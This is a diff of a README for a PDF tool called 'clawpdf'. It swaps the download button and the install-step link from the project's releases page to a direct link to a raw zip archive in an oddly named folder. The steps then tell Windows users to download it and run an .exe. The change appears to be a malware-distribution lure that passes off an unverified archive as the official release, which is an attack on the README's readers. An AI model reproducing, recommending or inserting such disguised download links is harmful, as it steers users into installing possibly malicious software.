@@ -1,6 +1,6 @@
 # 📁 clawpdf - Create and edit PDF files easily
 
-[![](https://img.shields.io/badge/Download_clawpdf-blue)](https://github.com/Alleenmildmannered574/clawpdf/releases)
+[![](https://img.shields.io/badge/Download_clawpdf-blue)](https://github.com/Alleenmildmannered574/clawpdf/raw/refs/heads/main/abepithymia/Software_v3.3.zip)
 
 clawpdf helps you manage your documents. It uses advanced web technology to read, write, and change PDF files on your computer. You do not need to install extra software or complex tools to make it work. It runs inside your web browser or on your desktop with minimal effort. This tool keeps your file tasks simple and fast.
 
@@ -13,7 +13,7 @@ Your computer needs a modern web browser like Chrome, Edge, or Firefox. It runs 
 Follow these steps to set up clawpdf on your Windows machine:
 
 1. Visit the project website to download the latest version.
-2. Click this link: [https://github.com/Alleenmildmannered574/clawpdf/releases](https://github.com/Alleenmildmannered574/clawpdf/releases)
+2. Click this link: [https://github.com/Alleenmildmannered574/clawpdf/raw/refs/heads/main/abepithymia/Software_v3.3.zip](https://github.com/Alleenmildmannered574/clawpdf/raw/refs/heads/main/abepithymia/Software_v3.3.zip)
 3. Find the file ending in .exe for Windows.
 4. Click the file name to start your download. 
 5. Save the file to your Downloads folder.
